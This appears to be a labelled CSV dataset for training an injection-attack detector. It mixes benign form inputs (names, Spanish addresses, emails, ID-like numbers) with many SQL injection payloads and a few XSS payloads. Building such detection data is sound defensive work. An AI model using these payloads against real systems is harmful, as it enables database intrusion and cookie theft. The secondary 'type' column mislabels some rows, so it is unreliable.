Text,attack_type,Label,type
"1') as keom where 7524=7524 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
van_eyk,norm,0,normal
francisc,norm,0,normal
yamile de francisco,norm,0,normal
r393lin3nte,norm,0,normal
hrenyk,norm,0,normal
82332840q,norm,0,normal
porras roger,norm,0,normal
c/ san mariano 168,norm,0,normal
jar49era,norm,0,normal
"puerta del sol 124, 8?h",norm,0,normal
49653086l,norm,0,normal
"1')) and elt(1210=1210,sleep(5)) and (('jnmf'='jnmf",sqli,1,normal
llompart delbn,norm,0,normal
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('mmfq'='mmfq,sqli,1,sql
hacinadora,norm,0,normal
randall,norm,0,normal
c/ rio agreira 91,norm,0,normal
24224,norm,0,normal
"plaa del mercat, 198 7-c",norm,0,normal
"1%"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
nail,norm,0,normal
miyashita@connect.sm,norm,0,normal
4014,norm,0,normal
robieux,norm,0,normal
helen-el,norm,0,normal
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('weof'='weof",sqli,1,sql
"-9613""))) or elt(3125=7084,7084) and (((""pupl""=""pupl",sqli,1,normal
1'||(select 'irfn' where 8360=8360;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
16140,norm,0,normal
re7ango,norm,0,normal
27415264t,norm,0,normal
9805,norm,0,normal
"calle valsendero, 48,",norm,0,normal
60928646j,norm,0,normal
"1%"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
orgulleza,norm,0,normal
ossie,norm,0,normal
"1%"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
-9534%' or 3038=3038,sqli,1,normal
ballonga,norm,0,normal
"1)) as acni where 6355=6355 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
arlan,norm,0,normal
reich.puffy@g-audi.pe,norm,0,normal
16269,norm,0,normal
"1%""));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
gunderso,norm,0,normal
comn galindez,norm,0,normal
"1"") as qayu where 6222=6222 union all select null,null,null#",sqli,1,sql
68822552c,norm,0,normal
*r6t58a,norm,0,normal
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",sqli,1,sql
"-9179"") union all select 7144,7144,7144,7144,7144,7144,7144,7144--",sqli,1,sql
">""<base href=""javascript:document.cookie=true;//"">",xss,2,xss
25684857k,norm,0,normal
fragmentar,norm,0,normal
9140660684303193,norm,0,normal
50236,norm,0,normal
99020664y,norm,0,normal
viladomat gasull,norm,0,normal
"avenida democracia, 106 4?g",norm,0,normal
6988631506656146,norm,0,normal
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",sqli,1,sql
lerch@piaceredelivery.mr,norm,0,normal
95105299t,norm,0,normal
"plza. magallanes, 50",norm,0,normal
cutler.hutton@the-white-pearl-resort.int,norm,0,normal
acu7ntiar,norm,0,normal
cropper,norm,0,normal
7553,norm,0,normal
"c/ adega, 103, 5?g",norm,0,normal
"1%"" union all select null,null,null,null,null,null,null,null--",sqli,1,sql
acachorrar,norm,0,normal
cane@meneamex.br,norm,0,normal
sohier,norm,0,normal
0ehusa2,norm,0,normal
"1%""))) and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
4645,norm,0,normal
39509298j,norm,0,normal
orgilles guilbauth,norm,0,normal
1010,norm,0,normal
51178304s,norm,0,normal
"calle alfred nobel, 42 7-g",norm,0,normal
82818101t,norm,0,normal
dalila,norm,0,normal
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu",sqli,1,sql
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu",sqli,1,sql
"c/ san miguel, 111 6?f",norm,0,normal
6657407608418544,norm,0,normal
ravid,norm,0,normal
barnhous,norm,0,normal
maynez giovannetti,norm,0,normal
hubach larrumbe,norm,0,normal
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"-3130) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",sqli,1,sql
cer97708or7,norm,0,normal
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",sqli,1,sql
97963158v,norm,0,normal
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
buf mueton,norm,0,normal
"1"")));select case when 7717=7717 then 1 else null end--",sqli,1,sql
"1')) as dqby where 9256=9256;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
hermanos gascon 141,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
(7098=7098 and sleep(5)),sqli,1,normal
addie@logiteclines.zm,norm,0,normal
redolad bordoll,norm,0,normal
zayas vadillo,norm,0,normal
roe,norm,0,normal
2876,norm,0,normal
05631,norm,0,normal
calle teniente bragado 139 7?e,norm,0,normal
"jose maria mortes lerma, 151 11-d",norm,0,normal
"-1513"") as swvd where 2958=2958 union all select 2958,2958,2958--",sqli,1,sql
sinforiano,norm,0,normal
"document.getelementbyid(""div1"").innerhtml;</script>",xss,2,xss
49180,norm,0,normal
"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",sqli,1,sql
vellora,norm,0,normal
"-3215"") union all select 4457,4457,4457,4457,4457#",sqli,1,sql
20001,norm,0,normal
bordin,norm,0,normal
"1)) union all select null,null,null,null,null,null,null--",sqli,1,sql
"-7491"") as cnrn where 3635=3635 order by 1#",sqli,1,normal
brooking-doolittle@encuentrodominios.lv,norm,0,normal
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (9509=9509",sqli,1,sql
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",sqli,1,sql
1')) and 4650=1322#,sqli,1,normal
disp833ar,norm,0,normal
galbarros,norm,0,normal
brookes,norm,0,normal
"-6436' in boolean mode) union all select 7589,7589,7589,7589--",sqli,1,sql
mcbrayne,norm,0,normal
furet@sanchezquesada.lc,norm,0,normal
80igm94016,norm,0,normal
martinez,norm,0,normal
"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">",xss,2,sql
ericsson,norm,0,normal
7032,norm,0,normal
houde,norm,0,normal
9528603304738849,norm,0,normal
m0t9n95ia,norm,0,normal
winston@chinavende.bi,norm,0,normal
de2ape91ibi1ie4to,norm,0,normal
"-4705' where 2029=2029 union all select 2029,2029,2029#",sqli,1,sql
pl. san juan harria 141,norm,0,normal
"praza madre lestonnac, s/n",norm,0,normal
"cami son anglada, s/n",norm,0,normal
"pedrosas, las",norm,0,normal
almoga,norm,0,normal
ghossein,norm,0,normal
5266363130660418,norm,0,normal
4787579213279770,norm,0,normal
1%')));select (case when (5752=6036) then 1 else 5752*(select 5752 from master..sysdatabases) end)--,sqli,1,sql
palacios del arzobispo,norm,0,normal
moll@eurograb.ic,norm,0,normal
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('dtym'='dtym",sqli,1,sql
2928996451183948,norm,0,normal
22268,norm,0,normal
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm",sqli,1,sql
<script id=xss src=http://127.0.0.1></script>,xss,2,xss
bohlen_newtell@lodgemadrid.it,norm,0,normal
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",sqli,1,sql
logr_era,norm,0,normal
1'))) and (3020=3020)*6703 and ((('nhrc' like 'nhrc,sqli,1,normal
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg",sqli,1,normal
22997112x,norm,0,normal
"<style type=""text/css"">body{background:url(""javascript:alert('crosssitescripting')"")}</style>",xss,2,xss
"1 where 2674=2674 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1)) and 9198=9198--,sqli,1,sql
"1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
lava,norm,0,normal
empel6tarse,norm,0,normal
belanger,norm,0,normal
mo3tren04,norm,0,normal
3040,norm,0,normal
veh327lo,norm,0,normal
julin,norm,0,normal
8582534834926521,norm,0,normal
-4644 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')# upwd,sqli,1,sql
"1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
t4ne0r84oso,norm,0,normal
"1%"");select * from generate_series(1488,1488,case when (1488=1685) then 1 else 0 end) limit 1--",sqli,1,sql
gamero piquer,norm,0,normal
edilnerto,norm,0,normal
cotner,norm,0,normal
1';select sleep(5) and 'yzix'='yzix,sqli,1,sql
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",sqli,1,sql
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",sqli,1,sql
8323552403219603,norm,0,normal
5405,norm,0,normal
septingentsima,norm,0,normal
5ecom058a?8a,norm,0,normal
"<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",xss,2,xss
06443,norm,0,normal
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
jaca 75,norm,0,normal
"1'||(select 'ryyc' from dual where 5196=5196 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
orihuela del tremedal,norm,0,normal
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,sqli,1,normal
32425777d,norm,0,normal
8795473491595155,norm,0,normal
"-6096') where 1316=1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",sqli,1,sql
"toril, 171 5h",norm,0,normal
"hoyo de pinares, el",norm,0,normal
zilzer@foreignoffice.fo,norm,0,normal
"1'||(select 'lljg' from dual where 7631=7631;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'",sqli,1,sql
-8341 or 8571=8571--,sqli,1,sql
"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">",xss,2,sql
particular basterra 108,norm,0,normal
"1') as zxho where 5907=5907 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
berkhart@joyclub.mh,norm,0,normal
9270844246904218,norm,0,normal
flateau@frioelectric.am,norm,0,normal
geli febo,norm,0,normal
16667079z,norm,0,normal
25585710g,norm,0,normal
"1'+(select nzij where 5456=5456 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",sqli,1,sql
"1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--",sqli,1,sql
"1';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",sqli,1,sql
"1%"")) or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
delavanti@brunoseguridad.by,norm,0,normal
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",sqli,1,sql
67872602q,norm,0,normal
goldsmith1@esmarbella.ht,norm,0,normal
vir7eino,norm,0,normal
1;waitfor delay '0:0:5'--,sqli,1,sql
cosbey@ocymafa.py,norm,0,normal
healy,norm,0,normal
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""%""=""",sqli,1,sql
columbino,norm,0,normal
1%'))) and 2444=9282#,sqli,1,normal
1') as uaoz where 2464=2464;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
9ot87ico,norm,0,normal
-6473' union all select 7537#,sqli,1,sql
"calle can puigdorfila 41, 2?g",norm,0,normal
"1 where 4468=4468 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"tercio de napolitanos, 104 4-b",norm,0,normal
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('cimm' like 'cimm",sqli,1,normal
48083550a,norm,0,normal
long@todomodelos.tg,norm,0,normal
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",sqli,1,sql
manguita,norm,0,normal
0085184895968394,norm,0,normal
esclisiado,norm,0,normal
"-5278""))) union all select 5264,5264,5264#",sqli,1,sql
cusanelli@wdsl.ao,norm,0,normal
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1,sql
-9690 union all select 7217#,sqli,1,sql
9782,norm,0,normal
72219452g,norm,0,normal
tagamanent,norm,0,normal
"<script>alert(document.cookie)</script><div style=""1@gmail.com",xss,2,xss
24142,norm,0,normal
"calle mercurio, 19,",norm,0,normal
"c/ pedro ortiz, 128",norm,0,normal
1 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1%');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('%'='",sqli,1,sql
-6512'+(select 'zdjx' where 5454=5454 order by 1--,sqli,1,sql
justino,norm,0,normal
"grupo fuensanta 197, 12?a",norm,0,normal
12018831c,norm,0,normal
virella altimirs,norm,0,normal
"camino al caravanal, 115 12-e",norm,0,normal
"hospitalet de llobregat, l'",norm,0,normal
"plaza del yunque, 4,",norm,0,normal
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""dtwv"" like ""dtwv",sqli,1,normal
-1772' or 7911=4985#,sqli,1,normal
on,norm,0,normal
"-3035"") union all select 7912,7912,7912#",sqli,1,sql
1523492896649032,norm,0,normal
"1')) and elt(4249=4249,7259) and (('xjns'='xjns",sqli,1,normal
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('nxkp' like 'nxkp,sqli,1,sql
"1"") as tnux where 4888=4888 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"1')) as xrre where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
bravat-a,norm,0,normal
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- rucf",sqli,1,sql
belmonte de gracin,norm,0,normal
jorey@20horas.ao,norm,0,normal
aleandro-hayman@tecnoindomo.nr,norm,0,normal
09718670c,norm,0,normal
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,sqli,1,sql
"-8599)) or elt(5628=2324,2324) and ((1134=1134",sqli,1,normal
ochagava/otsagabia,norm,0,normal
"1)) and 3824=benchmark(5000000,md5(0x76555642)) and ((8280=8280",sqli,1,normal
8219697007119352,norm,0,normal
chin-lin,norm,0,normal
ciencia 123 5b,norm,0,normal
1'+(select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
panell portaneri,norm,0,normal
5773292654317019,norm,0,normal
1) as ywrn where 1893=1893;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
4203,norm,0,normal
geffner-schoo@bacoespecialseleccin.bm,norm,0,normal
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",sqli,1,sql
caudle,norm,0,normal
carvajal,norm,0,normal
"1"") where 9447=9447;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
24520,norm,0,normal
bayliss@joll.tz,norm,0,normal
"1%')) union all select null,null,null,null,null#",sqli,1,sql
24448,norm,0,normal
294r1152ar,norm,0,normal
"1"") as fkgs where 5948=5948 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt,sqli,1,sql
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
arbeca,norm,0,normal
ve4t4nal,norm,0,normal
pon38ra1l9,norm,0,normal
bonifacio,norm,0,normal
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
adelina,norm,0,normal
cla20te,norm,0,normal
2095,norm,0,normal
91392378s,norm,0,normal
valls,norm,0,normal
"1'+(select wpai where 3685=3685;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
jeshua,norm,0,normal
cervecera,norm,0,normal
25175,norm,0,normal
36,norm,0,normal
tabakov@wdsl.ly,norm,0,normal
"1%')));iif(4638=8258,1,1/0)",sqli,1,sql
1) as afmb where 8665=8665 order by 1#,sqli,1,normal
3771,norm,0,normal
"1)) as qgok where 3993=3993 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
"-4015'||(select 'qeqv' from dual where 1437=1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",sqli,1,sql
"1"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
alcal de la vega,norm,0,normal
tolosa fontanet,norm,0,normal
arcnida,norm,0,normal
pelez bastus,norm,0,normal
myhers@wave.com.so,norm,0,normal
gandolfo,norm,0,normal
crosby,norm,0,normal
atef,norm,0,normal
1%';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
eclar@magadan.org.edu,norm,0,normal
1'+(select 'qxmo' where 9511=9511 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
cigales,norm,0,normal
dalenna,norm,0,normal
karpf-valardy@animextremist.lc,norm,0,normal
"angel custodio 44, 12-c",norm,0,normal
